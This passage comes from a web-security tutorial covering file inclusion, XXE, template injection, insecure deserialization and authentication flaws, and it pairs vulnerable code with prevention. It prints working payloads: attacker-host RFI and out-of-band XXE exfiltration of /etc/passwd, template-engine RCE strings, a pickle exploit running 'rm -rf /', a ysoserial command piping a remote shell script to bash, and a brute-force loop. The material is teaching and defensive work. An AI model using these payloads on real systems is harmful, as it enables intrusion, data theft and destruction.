http://vulnerable.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
```

**2. PHP Session Files**:

```php
// Set session variable with PHP code
$_SESSION['attack'] = '<?php system($_GET["cmd"]); ?>';

// Include session file
http://vulnerable.com/index.php?page=../../../../tmp/sess_[SESSIONID]&cmd=id
```

**3. PHP Wrappers**:

```text
# php://filter - Read PHP source code
http://vulnerable.com/?page=php://filter/convert.base64-encode/resource=config.php

# php://input - Execute POST data as PHP
POST /index.php?page=php://input
<?php system('whoami'); ?>

# data:// - Execute inline data
http://vulnerable.com/?page=data://text/plain,<?php system('whoami'); ?>
```

---

### Remote File Inclusion (RFI)

Allows including files from external servers.

**Vulnerable Code**:

```php
<?php
// VULNERABLE: allow_url_include = On
$page = $_GET['page'];
include($page . ".php");
?>
```

**Attack**:

1. Create malicious PHP file on attacker server (`http://attacker.com/evil.txt`):

   ```php
   <?php system($_GET['cmd']); ?>
   ```

2. Include via RFI:

   ```url
   http://vulnerable.com/index.php?page=http://attacker.com/evil.txt?&cmd=whoami
   ```

**Note**: `?` in the URL causes `.php` to be treated as a query parameter.

---

### Path Traversal & File Inclusion Prevention

#### 1. Whitelist Allowed Files

```php
<?php
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'];

if (!in_array($page, $allowed_pages)) {
    die("Invalid page");
}

include("/var/www/pages/" . $page . ".php");
?>
```

#### 2. Use Basename

```php
<?php
// Remove directory traversal sequences
$file = basename($_GET['file']);
$content = file_get_contents("/var/www/documents/" . $file);
?>
```

#### 3. Validate Input Against Patterns

```php
<?php
$file = $_GET['file'];

// Only allow alphanumeric, dash, underscore
if (!preg_match('/^[a-zA-Z0-9_-]+$/', $file)) {
    die("Invalid filename");
}

$content = file_get_contents("/var/www/documents/" . $file . ".pdf");
?>
```

#### 4. Disable Dangerous PHP Settings

In `php.ini`:

```ini
allow_url_fopen = Off
allow_url_include = Off
open_basedir = /var/www/html
```

#### 5. Use Realpath Validation

```php
<?php
$base_dir = '/var/www/documents/';
$file = $_GET['file'];

$full_path = realpath($base_dir . $file);

// Check if resolved path is within allowed directory
if ($full_path === false || strpos($full_path, $base_dir) !== 0) {
    die("Invalid file path");
}

$content = file_get_contents($full_path);
?>
```

---

## XML External Entity (XXE)

XML External Entity (XXE) is a vulnerability that allows attackers to interfere with an application's processing of XML data. It occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

### Why XXE Occurs

1. **Unsafe XML Parsing**: XML parser allows external entity resolution
2. **User-Controlled XML**: Application accepts XML input from users
3. **DTD Processing Enabled**: Document Type Definition (DTD) processing is enabled

### Impact of XXE

- **File Disclosure**: Read arbitrary files from the server
- **SSRF**: Make requests to internal/external systems
- **Denial of Service**: Billion Laughs attack (XML bomb)
- **Remote Code Execution**: In rare cases with specific configurations

---

### Basic XXE Example

**Vulnerable Code**:

```php
<?php
// VULNERABLE: XML parsing without disabling external entities
$xml = $_POST['xml'];

$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);

$items = $doc->getElementsByTagName('item');
foreach ($items as $item) {
    echo $item->nodeValue;
}
?>
```

**Attack Payload**:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <item>&xxe;</item>
</data>
```

**Result**: The content of `/etc/passwd` is read and displayed.

---

### XXE Attack Techniques

#### 1. File Disclosure

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Read PHP source code**:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<data>&xxe;</data>
```

#### 2. SSRF via XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.10/admin">
]>
<data>&xxe;</data>
```

**Access cloud metadata**:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

#### 3. Blind XXE (Out-of-Band)

When the application doesn't return the XXE result, exfiltrate data via external requests:

**Attack Flow**:

1. Host malicious DTD on attacker server (`http://attacker.com/xxe.dtd`):

   ```xml
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
   %eval;
   %exfil;
   ```

2. Trigger XXE in application:

   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [
     <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
     %xxe;
   ]>
   <data></data>
   ```

3. Attacker receives HTTP request with file contents:

   ```http
   GET /?data=root:x:0:0:root:/root:/bin/bash... HTTP/1.1
   ```

The data never travels back through the application response; it leaves
over a second connection the parser opens itself:

```text
  Victim app (XML parser)                  Attacker server
       |  1. parse XML containing %xxe            |
       |------- GET /xxe.dtd -------------------->|
       |<------ DTD with %file and %exfil --------|
       |  2. %file reads file:///etc/passwd       |
       |  3. %exfil builds a URL from that text   |
       |------- GET /?data=root:x:0:0... -------->|
       |                       4. file contents logged
```

#### 4. XXE Denial of Service (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

This expands to billions of "lol" strings, consuming all available memory.

---

### XXE Prevention

#### 1. Disable External Entity Processing

**PHP (libxml)**:

```php
<?php
// Safe by default: do NOT pass LIBXML_NOENT or LIBXML_DTDLOAD.
$doc = new DOMDocument();
$doc->loadXML($xml);
?>
```

With libxml 2.9 and later, external entity loading is disabled by
default, so a plain `loadXML()` call is already safe. The older
`libxml_disable_entity_loader()` helper is deprecated as of PHP 8.0 and
should not be relied on; the real mistake is explicitly re-enabling
entity substitution or DTD loading through the `$options` argument.

**Java (DocumentBuilderFactory)**:

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

// Disable external entity processing
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

DocumentBuilder builder = factory.newDocumentBuilder();
Document doc = builder.parse(new InputSource(new StringReader(xml)));
```

**Python (lxml)**:

```python
from lxml import etree

# Secure parser
parser = etree.XMLParser(resolve_entities=False, no_network=True)
doc = etree.fromstring(xml, parser)
```

**.NET**:

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;

using (XmlReader reader = XmlReader.Create(new StringReader(xml), settings))
{
    // Parse XML safely
}
```

#### 2. Use Simple Data Formats

Prefer JSON over XML when possible:

```php
// Instead of XML
$data = json_decode($_POST['data'], true);
```

#### 3. Input Validation

Validate XML structure before parsing:

```python
# Check for suspicious patterns
if '<!ENTITY' in xml or '<!DOCTYPE' in xml:
    raise Exception("Potentially malicious XML")
```

⚠️ **Warning**: This is a blacklist and is bypassable through encodings
and whitespace tricks. Use it only as an extra signal on top of a parser
that has entity and DTD processing switched off.

---

## Server-Side Template Injection (SSTI)

Server-Side Template Injection occurs when an attacker can inject template directives into a template, which are then executed server-side. This can lead to remote code execution.

### Why SSTI Occurs

1. **User Input in Templates**: User data is embedded directly into template syntax
2. **Unsafe Template Rendering**: Templates are rendered with user-controlled content
3. **Template Engines**: Vulnerability exists in various template engines (Jinja2, Twig, Freemarker, Velocity, etc.)

### Impact of SSTI

- **Remote Code Execution**: Execute arbitrary code on the server
- **File System Access**: Read/write files
- **Information Disclosure**: Access server-side objects and variables
- **Complete Server Compromise**

---

### SSTI Example (Jinja2 - Python)

**Vulnerable Code**:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'Guest')

    # VULNERABLE: User input directly in template
    template = f"<h1>Hello {name}!</h1>"
    return render_template_string(template)
```

**Normal Usage**:

```text
https://vulnerable.com/hello?name=John
→ <h1>Hello John!</h1>
```

**Attack Payload**:

```text
https://vulnerable.com/hello?name={{7*7}}
→ <h1>Hello 49!</h1>
```

The expression `{{7*7}}` is evaluated as template syntax!

**Remote Code Execution**:

```python
# Jinja2 RCE payload
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}
```

**Full Payload**:

```url
https://vulnerable.com/hello?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

### SSTI Exploitation by Template Engine

#### 1. Jinja2 (Python)

**Detection**:

```jinja
{{7*7}}  → 49
{{7*'7'}} → 7777777
```

**RCE Payload**:

```python
# Using 'os' module
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Using 'subprocess'
{{''.__class__.__mro__[1].__subclasses__()[414]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}

# Shorter payload
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

#### 2. Twig (PHP)

**Detection**:

```php
{{7*7}}  → 49
{{7*'7'}} → 49 (different from Jinja2!)
```

**RCE Payload**:

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

{{['id']|filter('system')}}
```

#### 3. Freemarker (Java)

**Detection**:

```java
${7*7}  → 49
```

**RCE Payload**:

```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

<#assign classloader=object?api.class.getClassLoader()>
<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

#### 4. Velocity (Java)

**Detection**:

```java
${{7*7}}  → 49
```

**RCE Payload**:

```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

### SSTI Prevention

#### 1. Never Put User Input Directly in Templates

**VULNERABLE**:

```python
template = f"<h1>Hello {user_input}!</h1>"
render_template_string(template)
```

**SECURE**:

```python
template = "<h1>Hello {{ name }}!</h1>"
render_template_string(template, name=user_input)
```

User input is passed as a variable, not embedded in template syntax.

#### 2. Use Logic-Less Template Engines

Consider template engines with limited functionality:

- **Mustache**: No logic, only variable substitution
- **Handlebars** (with restricted helpers)

#### 3. Sandbox Template Execution

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(user_template)
result = template.render(name=user_input)
```

⚠️ **Note**: Sandboxes can sometimes be bypassed. Defense in depth is critical.

#### 4. Input Validation

If user input must be in templates, strictly validate it:

```python
import re

# Only allow alphanumeric characters
if not re.match(r'^[a-zA-Z0-9]+$', user_input):
    raise Exception("Invalid input")
```

---

## Insecure Deserialization

Insecure deserialization occurs when untrusted data is used to reconstruct objects. This can lead to remote code execution, authentication bypass, or other attacks.

### Why Insecure Deserialization Occurs

1. **Trusting Serialized Data**: Application deserializes data from untrusted sources
2. **Magic Methods**: Languages have special methods called during deserialization
3. **Object Injection**: Attacker can control object types and properties

### Impact

- **Remote Code Execution**: Arbitrary code execution via gadget chains
- **Authentication Bypass**: Modify serialized session data
- **Data Tampering**: Alter object properties
- **Denial of Service**: Resource exhaustion

---

### PHP Object Injection

**Vulnerable Code**:

```php
<?php
class User {
    public $username;
    public $is_admin = false;

    public function __wakeup() {
        if ($this->is_admin) {
            echo "Welcome Admin!";
            // Grant admin privileges
        }
    }
}

// VULNERABLE: Deserializing user-controlled data
$data = $_COOKIE['user'];
$user = unserialize($data);
?>
```

**Normal Cookie**:

```text
O:4:"User":2:{s:8:"username";s:4:"john";s:8:"is_admin";b:0;}
```

**Attack**:

Modify serialized object:

```text
O:4:"User":2:{s:8:"username";s:8:"attacker";s:8:"is_admin";b:1;}
```

Set as cookie → Become admin!

**More Dangerous Example** (RCE):

```php
<?php
class Logger {
    public $logfile;

    public function __destruct() {
        // Write log when object is destroyed
        file_put_contents($this->logfile, "Log entry\n", FILE_APPEND);
    }
}

// VULNERABLE
$data = $_COOKIE['logger'];
$logger = unserialize($data);
?>
```

**Attack Payload**:

```php
<?php
class Logger {
    public $logfile = '/var/www/html/shell.php';
}

$payload = new Logger();
echo serialize($payload);
// O:6:"Logger":1:{s:7:"logfile";s:22:"/var/www/html/shell.php";}
?>
```

When deserialized, `__destruct()` writes to `shell.php`, creating a webshell!

---

### Python Pickle Deserialization

**Vulnerable Code**:

```python
import pickle

# VULNERABLE: Deserializing untrusted data
data = request.get_data()
obj = pickle.loads(data)
```

**Attack (RCE)**:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('rm -rf /',))

payload = pickle.dumps(Exploit())
# Send payload to vulnerable application
```

When deserialized, `os.system('rm -rf /')` is executed!

---

### Java Deserialization

**Vulnerable Code**:

```java
// VULNERABLE
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("data.ser"));
Object obj = ois.readObject();
```

**Attack**:

Java deserialization exploits use **gadget chains** - sequences of existing classes that, when chained together, achieve code execution.

**Tools**:

- **ysoserial**: Generate Java deserialization payloads
- **Gadget chains**: Commons-Collections, Spring, etc.

**Example**:

```bash
# Generate payload using ysoserial
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash' > payload.ser
```

---

### Insecure Deserialization Prevention

#### 1. Never Deserialize Untrusted Data

```python
# DON'T
user_data = pickle.loads(request.data)

# DO: Use safe formats
import json
user_data = json.loads(request.data)
```

#### 2. Use Safe Serialization Formats

- **JSON**: No code execution capabilities
- **XML** (with XXE protections): Safer than binary formats
- **Protocol Buffers, MessagePack**: Type-safe alternatives

#### 3. Implement Integrity Checks

Sign serialized data to detect tampering:

```python
import hmac
import hashlib

SECRET_KEY = b'secret'

def serialize_safe(obj):
    data = pickle.dumps(obj)
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    return signature + data

def deserialize_safe(signed_data):
    signature = signed_data[:32]
    data = signed_data[32:]

    expected_signature = hmac.new(SECRET_KEY, data, hashlib.sha256).digest()
    if not hmac.compare_digest(signature, expected_signature):
        raise Exception("Invalid signature")

    return pickle.loads(data)
```

⚠️ **Warning**: A signature only proves the data was not modified in
transit. The format is still `pickle`, so anyone who obtains the signing
key gets remote code execution. Prefer a format that cannot execute code.

#### 4. Restrict Deserialization Classes

**Java**:

```java
// Implement ObjectInputFilter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.SafeClass;!*"
);

ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);
```

**PHP**:

```php
// Whitelist allowed classes
$options = ['allowed_classes' => ['User', 'Product']];
$obj = unserialize($data, $options);
```

---

## Authentication and Authorization Flaws

Authentication verifies identity (who you are), while authorization determines permissions (what you can do). Flaws in these mechanisms can lead to complete application compromise.

### Common Authentication Vulnerabilities

#### 1. Weak Password Policy

**Issues**:

- No minimum length requirements
- No complexity requirements
- Common passwords allowed

**Example**:

```text
Password: password123  ✓ Accepted
Password: 123456  ✓ Accepted
```

**Prevention**:

```python
import re

def validate_password(password):
    if len(password) < 12:
        return False
    if not re.search(r'[A-Z]', password):
        return False
    if not re.search(r'[a-z]', password):
        return False
    if not re.search(r'[0-9]', password):
        return False
    if not re.search(r'[!@#$%^&*]', password):
        return False

    # Check against common passwords.
    # Compare whole lines: `password in f.read()` would also reject
    # any password that merely appears as a substring of the list.
    with open('common-passwords.txt') as f:
        common = {line.strip() for line in f}
    if password in common:
        return False

    return True
```

#### 2. Broken Brute-Force Protection

**Vulnerable Code**:

```php
<?php
// NO rate limiting!
$username = $_POST['username'];
$password = $_POST['password'];

if (check_credentials($username, $password)) {
    login($username);
}
?>
```

**Attack**:

```bash
# Brute force attack
for i in {1..10000}; do
    curl -d "username=admin&password=pass$i" https://victim.com/login
done
```

**Prevention**:

```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=lambda: request.remote_addr)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # 5 login attempts per minute
def login():
    # Login logic
    pass
```

#### 3. Insecure Session Management

**Session Fixation**:

```php
<?php
// VULNERABLE: Session ID not regenerated after login
session_start();

if (check_credentials($username, $password)) {
    $_SESSION['logged_in'] = true;
    $_SESSION['username'] = $username;
    // Missing: session_regenerate_id(true);
}
?>
```

**Attack**:

1. Attacker gets session ID: `PHPSESSID=attacker_session`
2. Attacker sends link to victim: `https://bank.com/?PHPSESSID=attacker_session`
3. Victim logs in (session ID unchanged)
4. Attacker uses same session ID → Logged in as victim!

**Prevention**:

```php
<?php
session_start();

if (check_credentials($username, $password)) {
    // Regenerate session ID after login
    session_regenerate_id(true);

    $_SESSION['logged_in'] = true;
    $_SESSION['username'] = $username;
}
?>
```

#### 4. JWT Vulnerabilities

**None Algorithm Attack**:

```python
import jwt

# VULNERABLE: the signature is never checked, so any token is trusted
token = jwt.decode(user_token, options={"verify_signature": False})
```

**Attack**:

```python
import base64
import json

# Create token with "none" algorithm
payload = {"user": "admin", "role": "admin"}
header = {"alg": "none"}

token = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=') + b'.'
token += base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=') + b'.'

# Send token (no signature needed when alg=none)
```

**Prevention**:

```python
# Explicitly specify allowed algorithms
token = jwt.decode(user_token, SECRET_KEY, algorithms=["HS256"])
```

### Common Authorization Vulnerabilities

#### 1. Insecure Direct Object References (IDOR)

**Vulnerable Code**:

```php
<?php
// VULNERABLE: No authorization check
$document_id = $_GET['id'];
$document = get_document($document_id);
echo $document->content;
?>
```

**Attack**:

```text
https://bank.com/document?id=1234  (my document)
https://bank.com/document?id=1235  (someone else's document!)
```

**Prevention**:

```php
<?php
$document_id = $_GET['id'];
$document = get_document($document_id);

// Check if current user owns this document
if ($document->user_id !== $_SESSION['user_id']) {
    http_response_code(403);
    die("Access denied");
}

echo $document->content;
?>
```

#### 2. Horizontal Privilege Escalation

**Attack**: User A accesses User B's resources

```http
GET /api/user/1234/profile  (my profile)
GET /api/user/1235/profile  (other user's profile - should be denied)
```

#### 3. Vertical Privilege Escalation

**Attack**: Regular user accesses admin functions

**Vulnerable Code**:

```javascript
// VULNERABLE: Client-side role check only
if (user.role === 'admin') {
    showAdminPanel();
}

// Admin API not protected!
app.post('/api/admin/delete-user', (req, res) => {
    deleteUser(req.body.userId);
});
```

**Attack**:

```bash
# Regular user calls admin API directly
curl -X POST https://victim.com/api/admin/delete-user -d '{"userId": 1}'
```

**Prevention**:

```javascript
// Server-side authorization check
app.post('/api/admin/delete-user', requireAuth, (req, res) => {
    if (req.user.role !== 'admin') {
        return res.status(403).json({ error: 'Forbidden' });
    }

    deleteUser(req.body.userId);
});
```

#### 4. Missing Function-Level Access Control

**Example**: Admin function accessible to anyone who knows the URL

```python
@app.route('/admin/users/delete/<user_id>', methods=['POST'])
def delete_user(user_id):
    # VULNERABLE: No permission check!
    User.query.filter_by(id=user_id).delete()
    return "User deleted"
```

**Prevention**:

```python
from functools import wraps

def require_admin(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('is_admin'):
            abort(403)
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin/users/delete/<user_id>', methods=['POST'])
@require_admin
def delete_user(user_id):
    User.query.filter_by(id=user_id).delete()
    return "User deleted"
```

---

## Defense in Depth

Effective server-side security requires multiple layers of protection:

1. **Secure Coding Practices**
   - Input validation (whitelist approach)
   - Output encoding
   - Parameterized queries
   - Principle of least privilege

2. **Framework Security Features**
   - Use built-in security functions
   - Enable security headers
   - Configure frameworks securely

3. **Infrastructure Security**
   - Network segmentation
   - Firewall rules
   - Security groups (cloud)

4. **Monitoring and Detection**
   - Log analysis
   - Intrusion detection systems (IDS)
   - Security Information and Event Management (SIEM)

5. **Regular Security Testing**
   - Static Application Security Testing (SAST)
   - Dynamic Application Security Testing (DAST)
   - Penetration testing
   - Bug bounty programs

---

## Key Takeaways

1. **Server-side vulnerabilities** directly compromise backend systems and are often more severe than client-side issues

2. **SQL Injection** remains prevalent despite being well-known; always use parameterized queries

3. **SSRF** is particularly dangerous in cloud environments due to metadata endpoints

4. **Command Injection** can lead to complete server compromise; avoid system commands when possible

5. **File Inclusion** vulnerabilities can escalate to RCE through log poisoning and wrappers

6. **XXE** attacks leverage XML parsing; disable external entity processing

7. **SSTI** allows RCE through template engines; never put user input directly in templates

8. **Insecure Deserialization** can be exploited for RCE; use safe formats like JSON

9. **Authentication/Authorization** flaws are common and critical; implement proper access controls

10. **Defense in Depth** is essential; no single control is sufficient

---

## Hands-On Exercises

1. **SQL Injection Practice**:
   - Set up a vulnerable web application (e.g., DVWA, bWAPP)
   - Practice Union-based, Blind, and Time-based SQLi
   - Use SQLmap to automate exploitation

2. **SSRF Exploitation**:
   - Deploy a web app with URL fetching feature
   - Access cloud metadata endpoints (in safe environment)
   - Practice bypass techniques

3. **Command Injection**:
   - Create a ping utility with unsanitized input
   - Practice command separators and filter bypasses
   - Implement secure version using subprocess with arrays

4. **LFI to RCE**:
   - Set up PHP application with LFI vulnerability
   - Practice log poisoning technique
   - Experiment with PHP wrappers

5. **XXE Exploitation**:
   - Create XML parsing endpoint
   - Practice file disclosure and SSRF via XXE
   - Implement secure XML parsing

6. **SSTI**:
   - Deploy Flask/Jinja2 application with template injection
   - Craft RCE payloads for different template engines
   - Practice detection and exploitation

7. **Authorization Testing**:
   - Test web applications for IDOR vulnerabilities
   - Practice horizontal and vertical privilege escalation
   - Implement proper authorization controls

---

## Resources

### Official Documentation

- <https://portswigger.net/web-security/sql-injection>
- <https://portswigger.net/web-security/ssrf>
- <https://portswigger.net/web-security/os-command-injection>
- <https://portswigger.net/web-security/file-path-traversal>
- <https://portswigger.net/web-security/xxe>
- <https://portswigger.net/web-security/server-side-template-injection>

### OWASP Resources

- <https://owasp.org/www-community/attacks/SQL_Injection>
- <https://owasp.org/www-community/attacks/Server_Side_Request_Forgery>
- <https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data>
- <https://owasp.org/www-project-web-security-testing-guide/>

### Practice Platforms

- **PortSwigger Web Security Academy**: Free interactive labs
- **HackTheBox**: Realistic vulnerable machines
- **TryHackMe**: Guided learning paths
- **PentesterLab**: Web penetration testing exercises
- **DVWA (Damn Vulnerable Web Application)**: Practice environment
- **bWAPP**: Buggy web application for testing

### Tools

- **SQLmap**: Automated SQL injection tool
- **Burp Suite**: Web application security testing
- **ysoserial**: Java deserialization exploit tool
- **tplmap**: Server-side template injection detection
- **XXEinjector**: XXE exploitation tool
- **Commix**: Command injection exploitation tool

### Books

- "The Web Application Hacker's Handbook" by Dafydd Stuttard and Marcus Pinto
- "Web Security Testing Cookbook" by Paco Hope and Ben Walther
- "SQL Injection Attacks and Defense" by Justin Clarke
